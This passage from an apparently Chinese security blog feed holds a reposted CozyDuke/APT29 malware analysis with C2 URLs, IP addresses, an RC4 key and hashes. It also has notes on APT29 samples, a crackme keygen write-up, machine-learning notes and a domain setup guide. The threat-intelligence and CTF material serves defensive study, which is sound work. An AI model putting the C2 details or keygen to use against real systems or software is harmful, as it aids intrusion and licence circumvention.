src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061820/cryptedBlob.png" alt="cryptedBlob"></a></p><p>The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “x8BxFFx55x8BxECx83xECx50xA1x84x18x03x68x33xC9x66xF7x45x10xE8x1Fx89x45xFCx8Bx45x14x56”.</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061813/DecryptedBlob.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061813/DecryptedBlob.png" alt="DecryptedBlob"></a></p><p>The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality:</p><p>InternetCloseHandle<br>InternetReadFile<br>HttpSendRequestA<br>HttpOpenRequestA<br>HttpQueryInfoA<br>InternetConnectA<br>InternetCrackUrlA<br>InternetOpenA<br>InternetSetOptionW<br>GetAdaptersInfo</p><p>Much like the prior office monkey “atiumdag.dll” component, this code collects identifying system information using standard win32 API calls:</p><ul><li>Computer name – GetComputerNameW</li><li>User name – GetUserNameW</li><li>Adapter GUID, ip address, mac address – GetAdaptersInfo</li><li>Windows version – GetVersionExW</li></ul><p>It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls.</p><p>Cache.dll connectback urls:</p><ul><li>209.200.83.43/ajax/links.php</li><li>209.200.83.43/ajax/api.php</li><li>209.200.83.43/ajax/index.php</li><li>209.200.83.43/ajax/error.php</li><li>209.200.83.43/ajax/profile.php</li><li>209.200.83.43/ajax/online.php</li><li>209.200.83.43/ajax/loader.php</li><li>209.200.83.43/ajax/search.php</li></ul><p>Observed user-agent string on the wire, but it’s dynamically generated based on the Windows system settings (retrieved using standard win32 api “ObtainUserAgentString”):<br>“User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)”</p><p>Communications with the CozyDuke C2 include key/value pairs passed as URL parameters. Observed keys that remind us of the Cosmicduke communications include:</p><ul><li>status=</li><li>k=</li><li>mode=</li><li>ajax=</li><li>name=</li><li>subNodeId=</li><li>nodeId=</li><li>r=</li><li>t=</li><li>id=</li><li>item=</li><li>item_id=</li><li>js=</li><li>j=</li><li>v=</li><li>json=</li><li>i=</li><li>c=</li><li>x=</li><li>a=</li></ul><h3 id="Connections-with-MiniDuke-CosmicDuke-OnionDuke"><a href="#Connections-with-MiniDuke-CosmicDuke-OnionDuke" class="headerlink" title="Connections with MiniDuke/CosmicDuke/OnionDuke:"></a>Connections with MiniDuke/CosmicDuke/OnionDuke:</h3><p>One of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke. Below we compare Show.dll with the OnionDuke sample MD5: c8eb6040fd02d77660d19057a38ff769. Both have exactly the same export tables and appear to be called internally “UserCache.dll”:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061805/onion.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061805/onion.png" alt="onion"></a></p><p>This seems to indicate the authors of OnionDuke and CozyDuke / Cozy Bear are the same, or working together.</p><p>Another interesting comparison of two other files matches a recent second stage tool from the CozyDuke attacks with a second stage component from other Miniduke/Onionduke attacks.</p><p>2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “<strong>UserCache.dll</strong>“)<br>9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “<strong>UserCache.dll</strong>“)</p><p>The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time. The table below presents the function matches based on size data, but the calls, jmps and code all match as well. The contents of only one of these exports in update.dll has no match whatsoever in cache.dll.</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061800/exports.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061800/exports.png" alt="exports"></a></p><p>Unlike the atiumdag.dll file above, however, cache.dll and update.dll do not maintain anti-AV and anti-analysis functionality sets. Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality. This rotating functionality seems representational for the set, along with other characteristics. Their custom backdoor components appear to slightly evolve over time, with modifications to anti-detection, cryptography, and trojan functionality changing per operation. This rapid development and deployment reminds us of the APT28/Sofacy toolset, especially the coreshell and chopstick components.</p><p>We expect ongoing and further activity from this group in the near future and variations on the malware used in previous duke-ish incidents.</p><p>For more information about MiniDuke, CosmicDuke and OnionDuke, please see References.</p><h3 id="Related-MD5s"><a href="#Related-MD5s" class="headerlink" title="Related MD5s"></a>Related MD5s</h3><p>62c4ce93050e48d623569c7dcc4d0278, 2537.ex_<br>a5d6ad8ad82c266fda96e076335a5080, drop1.ex_<br>93176df76e351b3ea829e0e6c6832bdf, drop1.pd_<br>7688be226b946e231e0cd36e6b708d20, 8.zip<br>fd8e27f820bdbdf6cb80a46c67fd978a, doc853.ex_<br>93176df76e351b3ea829e0e6c6832bdf, doc853.pdf<br>9ad55b83f2eec0c19873a770b0c86a2f, reader_sl.ex_<br>f16dff8ec8702518471f637eb5313ab2 1.ex_<br>8670710bc9477431a01a576b6b5c1b2a<br>93176df76e351b3ea829e0e6c6832bdf, droppedhppscan854.pdf<br>f58a4369b8176edbde4396dc977c9008, droppedreader_sl.ex_<br>83f57f0116a3b3d69ef7b1dbe9943801<br>b5553645fe819a93aafe2894da13dae7<br>acffb2823fc655637657dcbd25f35af8<br>1a42acbdb285a7fba17f95068822ea4e<br>d543904651b180fd5e4dc1584e639b5e<br>d7af9a4010c75af6756a603fd6aef5a4<br>93176df76e351b3ea829e0e6c6832bdf, 3852.pdf<br>f2b05e6b01be3b6cb14e9068e7a66fc1, droppedreader_sl.ex_<br>57a1f0658712ee7b3a724b6d07e97259, dropped3852.ex_<br>93176df76e351b3ea829e0e6c6832bdf, 5463.pdf<br>eb22b99d44223866e24872d80a4ddefd, dropped5463reader_sl.ex_<br>90bd910ee161b71c7a37ac642f910059, dropped5463.ex_<br>1a262a7bfecd981d7874633f41ea5de8<br>98a6484533fa12a9ba6b1bd9df1899dc<br>7f6bca4f08c63e597bed969f5b729c56<br>08709ef0e3d467ce843af4deb77d74d5</p><h3 id="Related-CozyDuke-C-amp-Cs"><a href="#Related-CozyDuke-C-amp-Cs" class="headerlink" title="Related CozyDuke C&amp;Cs:"></a>Related CozyDuke C&amp;Cs:</h3><table><thead><tr><th>1234567891011121314151617181920212223</th><th>121.193.130.170:443/wp-ajax.php183.78.169.5:443/search.php200.119.128.45:443/mobile.php200.125.133.28:443/search.php200.125.142.11:443/news.php201.76.51.10:443/plugins/json.php202.206.232.20:443/rss.php202.76.237.216:443/search.php203.156.161.49:443/plugins/twitter.php208.75.241.246:443/msearch.php209.40.72.2:443/plugins/fsearch.php210.59.2.20:443/search.php208.77.177.24:443/fsearch.php<a href="http://www.getiton.hants.org.uk/themes/front/img/ajax.phpwww.seccionpolitica.com.ar:80/galeria/index.php209.200.83.43/ajax/links.php209.200.83.43/ajax/api.php209.200.83.43/ajax/index.php209.200.83.43/ajax/error.php209.200.83.43/ajax/profile.php209.200.83.43/ajax/online.php209.200.83.43/ajax/loader.php209.200.83.43/ajax/search.php">www.getiton.hants.org.uk:80/themes/front/img/ajax.phpwww.seccionpolitica.com.ar:80/galeria/index.php209.200.83.43/ajax/links.php209.200.83.43/ajax/api.php209.200.83.43/ajax/index.php209.200.83.43/ajax/error.php209.200.83.43/ajax/profile.php209.200.83.43/ajax/online.php209.200.83.43/ajax/loader.php209.200.83.43/ajax/search.php</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h3 id="Appendix-Parallel-and-Previous-Research"><a href="#Appendix-Parallel-and-Previous-Research" class="headerlink" title="Appendix: Parallel and Previous Research"></a>Appendix: Parallel and Previous Research</h3><p><a href="http://securelist.com/blog/31112/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/">The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor</a>, Securelist, Feb 2013<br><a href="https://securelist.com/blog/64107/miniduke-is-back-nemesis-gemina-and-the-botgen-studio/">Miniduke is back: Nemesis Gemina and the Botgen Studio</a>, Securelist, July 2014<br><a href="http://blog.crysys.hu/2014/07/miniduke-2-cosmicduke/">MiniDuke 2 (CosmicDuke)</a>, CrySyS, July 2014<br>[COSMICDUKE Cosmu with a twist of MiniDuke <a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/20081948/cosmicduke_whitepaper.pdf">pdf]</a>, F-Secure, September 2014<br><a href="http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/">THE CASE OF THE MODIFIED BINARIES</a>, Leviathan Security, October 2014<br><a href="http://bartblaze.blogspot.com/2014/09/a-word-on-cosmicduke.html">A word on CosmicDuke</a>, Blaze’s Security Blog, September 2014<br><a href="https://www.f-secure.com/weblog/archives/00002764.html">OnionDuke: APT Attacks Via the Tor Network</a>, F-Secure, November 2014<br><a href="https://www.f-secure.com/weblog/archives/00002780.html">The Connections Between MiniDuke, CosmicDuke and OnionDuke</a>, F-Secure, January 2015</p><p>Kaspersky Lab products detect the malware used by the CozyDuke threat actor as:<br>HEUR:Trojan.Win32.CozyDuke.gen<br>Trojan.Win32.CozyBear.*</p>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apt </tag>
            
            <tag> CozyDuke </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apt29样本分析记录</title>
      <link href="2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
      <url>2019/12/16/apt29%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>凭着记忆和网上公开的资料写下的分析记录，因为是公司的任务，具体的分析文件（样本、.idb…）不能泄露。其实网上大部分都有记录了的，尤其是一些国外的威胁情报网站。</p><h4 id="0354FE2800A994CE774F6BBA385BF9F0"><a href="#0354FE2800A994CE774F6BBA385BF9F0" class="headerlink" title="0354FE2800A994CE774F6BBA385BF9F0"></a>0354FE2800A994CE774F6BBA385BF9F0</h4><p>Dll文件，微步查出的恶意评分为60，看到其中一个杀软爆出的为Trojan.Cozer的变种，然后去搜索了一下Cozer是个什么木马，百度太垃圾了，搜不到。谷歌搜索之后，<a href="https://www.symantec.com/security-center/writeup/2015-030500-0430-99">在赛门铁克的网站上找到了对该木马的描述</a>。</p><blockquote><p> Trojan.Cozer is a Trojan horse that opens a back door on the compromised computer. </p></blockquote><p>最后分析出来其存在以下特征：</p><ul><li><p>由于是Dll文件，所以可能需要其他exe程序来调用。</p></li><li><p>在其DLLMain函数中会解码文件中固定的数据，解码的方式好像都是特定的<code>用字符串的索引值与该索引处的字符的ASC码异或，再与一个特定的值异或</code>，最后得到的都是固定的值，下方给出的IOC信息对应的样本也是一样，固定的数据不同，导致特定的那个异或值也不同。</p></li><li><p>经过解码得到的字符串如下：</p><ul><li><code>Software\Classes\CLSID\&#123;603D3801-BD81-11D0-A3A5-00C04FD706EC&#125;</code></li><li><code>Parameters</code></li></ul><p>上面的两个字符串指向的是注册表中的CLSID处的值，如果电脑中存在此注册表的值，就会执行Parameters处指向的程序，猜测这里应该就是后门程序安装之后设置的注册表的值吧。</p></li></ul><p>下面则是其他的具有相同特征的样本的HASH值：</p><p>D36351AF2453640663BBA20D365E5383 (64bit，Dll)</p><p>913967B243FD49FFAD3DE984642E2EBA </p><p>3C8469D2C5AF6AB277A6BE483A1775F5(64bit，Dll)</p><h4 id="95B3EC0A4E539EFAA1FAA3D4E25D51DE"><a href="#95B3EC0A4E539EFAA1FAA3D4E25D51DE" class="headerlink" title="95B3EC0A4E539EFAA1FAA3D4E25D51DE"></a>95B3EC0A4E539EFAA1FAA3D4E25D51DE</h4><p>这是一个具有迷惑性的样本，执行后会在Temp目录下生成两个exe文件，<code>Monkeys.exe</code>和<code>player.exe</code>其中第一个程序是正常无毒的程序，恶意行为都在<code>player.exe</code>中。</p><p><code>player.exe</code>会在<code>Roaming</code>目录下生成另外一组恶意程序（包含Dll），然后删除自身。</p><p><code>Roaming</code>目录下恶意程序都在<code>ATI_Subsystem</code>目录中，包含<code>amdocl_as32.exe</code>和<code>atiumdag.dll</code>，<code>admhcp32.dll</code>,<code>aticaldd.dll</code>，<code>racss.dat</code>。其中跟踪到的执行恶意连接行为的cmdline为：<code>amdocl_as32.exe  atiumdag.dll,ADL2_ApplicationProfiles_System_Reload_SEH</code>。</p><p>使用<code>SystemTracer</code>监测到有DNS查询记录<code>www.sanjosemaristas[.]com</code>.然后使用PCHunter修改Hosts文件，使得该域名指向另外一台准备好的虚拟机，这样就能进一步跟踪行为，使用<code>HFS</code>在另外一台虚拟机上面搭建简单的<code>HTTP</code>服务器。就可以进一步跟踪使用wireshark抓包，发现样本会请求该域名下的<code>app/index.php</code>文件。</p><h4 id="94C9DF2E1357E32D97ADD13FE8A91A89"><a href="#94C9DF2E1357E32D97ADD13FE8A91A89" class="headerlink" title="94C9DF2E1357E32D97ADD13FE8A91A89"></a>94C9DF2E1357E32D97ADD13FE8A91A89</h4><p>该样本是一个32bit的Dll文件，使用IDA打开可以查看编译信息，原始的文件名我忘记叫什么去了，不过和上面那个样本释放出来的Dll文件类似。</p><p>该样本有一个导出函数也和上面的Dll的导出函数类似，该样本会通过调用LoadLibrary和GetProcAddress这两个函数来获取网络连接的API的函数地址，然后以指针的形式放在全局数组中，需要时就会通过寄存器赋值的方式调用API实现网络通信。其中存在很多敏感的字符串，全部都是编码过后存放在数据段的，解码的方式同上面几个样本中提到的基本类似，只是简单的异或。样本会新建一个大小为<code>0x11B8</code>的堆，然后用来存放获取到的本地主机的信息，包括系统版本信息、电脑名、用户名、网卡信息等等，不过在这个堆的第4-8个字节处存放的是固定的大小<code>0x11C</code>,在内存中以小端的方式存储就是<code>1C 01 00 00</code>，我查过<code>GetVersion</code>这个函数返回的结构体的大小应该为<code>0x114</code>,这里却很奇怪的固定赋值为<code>0x11C</code>。</p><p>后续对该样本进行调试，发现其网络连接行为同上面的第二类样本一致。</p><h4 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h4><p>TCP connect：<code>http://www.sanjosemaristas[.]com</code></p><p>Http GET: <code>http://www.sanjosemaristas[.]com/app/index.php</code></p><p>其实这个样本还有很多地方值得深思，很多编写的技巧都很巧妙，我也许应该从微步上面把这个样本下载下来好好研究一下。</p>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apt29 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KCTF-婉若游龙</title>
      <link href="2019/12/05/KCTF-%E5%A9%89%E8%8B%A5%E6%B8%B8%E9%BE%99/"/>
      <url>2019/12/05/KCTF-%E5%A9%89%E8%8B%A5%E6%B8%B8%E9%BE%99/</url>
      
        <content type="html"><![CDATA[<h3 id="婉若游龙"><a href="#婉若游龙" class="headerlink" title="婉若游龙"></a>婉若游龙</h3><p>这题挺简单的，算法也不难。很快就写出了KeyGen，不过有一点需要注意的事，程序似乎没有控制好缓冲区的长度，导致serial处输入32个任意字符后会直接弹出正确的提示信息，会给新手很迷惑的感觉。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>HardCoded硬编码很简单，在IDA中跟一下字符串就可以找到，就是“HardCoded”。然后输入name: <code>CTFHUB</code>.和serial：<code>XXXXXX...</code>。</p><p>对name的处理是每个字符先对<code>0xA</code>取余，然后与在整个字符串中的位置相异或，再加2，最后再对<code>0xA</code>取余得到6个字节的checksum。</p><p>对serial的处理就是对每个字符<code>0xA</code>取余，得到对应的checksum。</p><p>最后两个checksum比较，相同则成功。</p><h4 id="KeyGen"><a href="#KeyGen" class="headerlink" title="KeyGen"></a>KeyGen</h4><p>菜鸡花了点时间写了个脚本，有错误请指出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">KCTF-婉若游龙</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">name = <span class="string">&quot;CTFHUB&quot;</span></span><br><span class="line">serial = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serial_proc</span>(<span class="params">serial</span>):</span></span><br><span class="line">    checksum = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> serial:</span><br><span class="line">        checksum.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(ch)%<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(checksum)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_proc_serial</span>(<span class="params">checksum, offset</span>):</span></span><br><span class="line">    serial = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> checksum:</span><br><span class="line">        serial += <span class="built_in">chr</span>(<span class="built_in">int</span>(i) + offset) <span class="comment"># 这里加offset是为了保证字符可见且正常</span></span><br><span class="line">    <span class="keyword">return</span> serial</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    checksum_name = []</span><br><span class="line">    offsets = [<span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">100</span>, <span class="number">110</span>]</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> name:</span><br><span class="line">        tmp = (i ^ (<span class="built_in">ord</span>(ch)%<span class="number">10</span>)) + <span class="number">2</span> <span class="comment"># 先取余，再异或</span></span><br><span class="line">        tmp = tmp % <span class="number">10</span></span><br><span class="line">        checksum_name.append(<span class="built_in">str</span>(tmp))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    c = <span class="string">&quot;&quot;</span>.join(checksum_name)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;CTFHUB checksum:&quot;</span> + c</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> offsets:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;KeyGen Serials:&quot;</span> + re_proc_serial(c, offset)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;output</span></span><br><span class="line"><span class="string">CTFHUB checksum:974335</span></span><br><span class="line"><span class="string">KeyGen Serials:&#x27;%&quot;!!#</span></span><br><span class="line"><span class="string">KeyGen Serials:1/,++-</span></span><br><span class="line"><span class="string">KeyGen Serials:;96557</span></span><br><span class="line"><span class="string">KeyGen Serials:EC@??A</span></span><br><span class="line"><span class="string">KeyGen Serials:OMJIIK</span></span><br><span class="line"><span class="string">KeyGen Serials:YWTSSU</span></span><br><span class="line"><span class="string">KeyGen Serials:ca^]]_</span></span><br><span class="line"><span class="string">KeyGen Serials:mkhggi</span></span><br><span class="line"><span class="string">KeyGen Serials:wurqqs</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KCTF </tag>
            
            <tag> CrackMe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《机器学习》笔记</title>
      <link href="2019/12/04/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
      <url>2019/12/04/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="《机器学习》-周志华-笔记"><a href="#《机器学习》-周志华-笔记" class="headerlink" title="《机器学习》(周志华)笔记"></a>《机器学习》(周志华)笔记</h3><p>花了大概一个月的时间吧《IDA Pro》看完了，昨天重温了一下笔记，发现还是有很大的作用的，所以机器学习也这样来做。这是一本机器学习比较经典的书，由于开头的绪论作者用一个买西瓜的例子来简单阐述了什么是机器学习，故网上称之为“西瓜书”。同样我打算买一本实体书而且也确实买了。机器学习涉及的数学知识基础可能会成为我学习的阻力，所以我想再在慕课网上通过视频学习的方式来补充一下，预计会在上面花钱购买一套课程，花钱学习这事儿，本就是应该的。</p><p>阅读所记下的笔记可能因人而异，就像在第一章中所提到的NFL原理一样，具体问题需要具体去分析，我也可能只细读我想了解的知识，而对一些历史沿革，数学性强的知识也会略过。</p><h4 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h4><ol><li><p>机器学习是研究关于“学习算法”的学问。</p></li><li><p>关键的术语（由大到小）：数据/数据集—-&gt;示例/样本—-&gt;属性/特征。</p></li><li><p>标记：关于示例结果的信息称为<code>标记</code>；而拥有了标记的示例则称为“样例”。</p></li><li><p>学习任务的类型：</p><table><thead><tr><th>预测的结果</th><th>学习任务类型</th></tr></thead><tbody><tr><td>已知的离散值</td><td>分类（监督学习）</td></tr><tr><td>未知的离散值</td><td>聚类（无监督学习）</td></tr><tr><td>连续值</td><td>回归</td></tr></tbody></table><p>这里的离散值可以理解为一个确定的类别、标记。</p></li><li><p>学得的模型适用于新样本的能力，称为“泛化”能力。</p></li><li><p>假设空间：把学习过程看作一个在所有假设（hypothesis）组成的空间中进行搜索的过程，搜索的目标是找到与训练集匹配的假设。</p></li><li><p>归纳偏好：在学习过程中对某种类型假设的偏好，称为“归纳偏好”。而归纳偏好的设置和特征/属性选择有关。</p></li><li><p>NFL定理：没有一个学习算法在任何领域总是产生最准确的学习器。脱离具体问题，空泛的谈论“什么学习算法更好”毫无意义，这是一个普适性的原理，在生活和哲学上似乎也是如此。</p></li></ol><h4 id="第二章-模型评估与选择"><a href="#第二章-模型评估与选择" class="headerlink" title="第二章 模型评估与选择"></a>第二章 模型评估与选择</h4><ol><li><p>模型选择：不同的学习算法、不同的参数配置产生不同的学习模型，通过模型选择使得经验误差最小化以求得最优解。</p></li><li><p>将同一个数据集分为训练集和测试集的方法：<strong>留出法</strong>，<strong>交叉验证法</strong>，<strong>自助法</strong>。</p><p>留出法比较简单，就是将这个数据集分为两个互斥的集合，一个用做训练、一个用做测试；</p><p>交叉验证法则稍微有点复杂，它是将这个数据集划分为同样大小的<code>k</code>个互斥子集，每次用<code>k-1</code>个子集的并集作为训练，剩下的那个子集作为测试，从而就可以进行<code>k</code>次训练和测试，最后的结果取均值；交叉验证法的一个特例“留一法”，即数据集D中存在m个样本，而<code>m=k</code>,则相当于只留下了一个样本来做为测试集，这使得训练的结果和整个数据集D训练的结果很相似，但是对于数据集比较大的时候，开销也比较大；</p><p>自助法是采用自助采样的方法将数据集分为训练集和测试集的，其中测试集占比为:<br>$$<br>\lim_{m \to \infty}({\frac{1}{1-m})^m} = \frac{1}{e} = 0.368<br>$$<br>自助法适用在数据集较小、难以划分训练/测试集的情况下。</p></li><li><p>性能度量：</p><p>对于回归任务,称作均方误差，下面是较为一般的描述<code>f</code>为学习器，<code>D</code>为数据集，<code>p(·)</code>为概率密度函数：<br>$$<br>E(f;D) = \int^{D}<em>{x}{(f(x)-y)^2p(x)dx}<br>$$<br>对于分类任务，称作错误率与精度：<br>$$<br>acc(f;D) = \frac{1}{m}\sum^{m}</em>{i=1}\prod(f(x_i)=y_i)<br>$$</p><p>这里先介绍什么是混淆矩阵，下表即为混淆矩阵，TP是预测正确的正例的数目，TN是预测正确的反例的数目，FP、FN则依次是预测失败的正例、反例的数目，所有的加起来就是总的样例数目：</p><table><thead><tr><th align="center"></th><th align="center">预测结果</th><th align="center">预测结果</th></tr></thead><tbody><tr><td align="center"><strong>真实情况</strong></td><td align="center">正例</td><td align="center">反例</td></tr><tr><td align="center">正例</td><td align="center">TP</td><td align="center">FN</td></tr><tr><td align="center">反例</td><td align="center">FP</td><td align="center">TN</td></tr></tbody></table><p>其他任务需求，则可能使用查准率(precision)、查全率（召回recall），依照混淆矩阵：<br>$$<br>P = \frac{TP}{TP+FP},<br>R = \frac{TP}{TP+FN}<br>$$<br>由于查准率和查全率是一对互相矛盾的度量，其一高，另一必低，所以需要找到一个BEP（平衡点）来进行取舍，这是当P=R时的取值，如下图：</p><p><img src="/2019/12/04/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0/image-20191220002808584.png" alt="image-20191220002808584"></p><p>而BEP毕竟过于简化，更为常用的称为F1 Score：<br>$$<br>F1 = \frac{2 \times P \times R}{P+R}<br>$$</p></li><li><p>后面这部分简略一点，我没打算现在就弄懂：</p><ul><li><p>ROC: 全称为“受试者工作特征（Receiver Operating Characteristic）”曲线，同上面的P-R曲线图类似，不过横轴、纵轴不一样。</p></li><li><p>AUC：Area Under ROC Curve，ROC曲线下的面积，用来衡量学习器的期望性能。</p><p><img src="/2019/12/04/%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0/image-20191220005000173.png" alt="image-20191220005000173"></p></li></ul></li><li><p>代价曲线、k折交叉验证法以及针对回归任务的偏差-方差-协方差分解，现在只需要有个简单的印象即可。</p></li></ol><h4 id="第三章-线性模型"><a href="#第三章-线性模型" class="headerlink" title="第三章 线性模型"></a>第三章 线性模型</h4>]]></content>
      
      
      <categories>
          
          <category> Read Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绑定自定义域名以及添加SSL证书</title>
      <link href="2019/12/01/%E7%BB%91%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8A%E6%B7%BB%E5%8A%A0SSL%E8%AF%81%E4%B9%A6/"/>
      <url>2019/12/01/%E7%BB%91%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8A%E6%B7%BB%E5%8A%A0SSL%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<p>现在的这个域名不是太好，也没多久就到期了，大概一月份会重新买个时间长一点的域名。</p><h3 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h3><p>在source目录下添加一个CNAME文件，文件内容为自定义的域名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;spwpun.site&quot;</span> &gt; CNAME</span><br></pre></td></tr></table></figure><p>然后生成文件，并部署到github上。</p><h3 id="设置github项目"><a href="#设置github项目" class="headerlink" title="设置github项目"></a>设置github项目</h3><p>在github对应的项目的options中设置custom domain：</p><p><img src="/2019/12/01/%E7%BB%91%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8A%E6%B7%BB%E5%8A%A0SSL%E8%AF%81%E4%B9%A6/image-20191201164346031.png" alt="image-20191201164346031"></p><h3 id="配置域名DNS"><a href="#配置域名DNS" class="headerlink" title="配置域名DNS"></a>配置域名DNS</h3><p>然后到你的域名管理里去配置DNS记录，其中A记录是指向主机的，即就是指向IP地址，这里可以先看一下自己的原始github域名对应的IP地址是什么。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\*****&gt; nslookup spwpun.github.io</span><br><span class="line">服务器:  ********</span><br><span class="line">Address:  **********</span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">名称:    spwpun.github.io</span><br><span class="line">Addresses:  <span class="number">185.199</span>.<span class="number">110.153</span></span><br><span class="line">          <span class="number">185.199</span>.<span class="number">108.153</span></span><br><span class="line">          <span 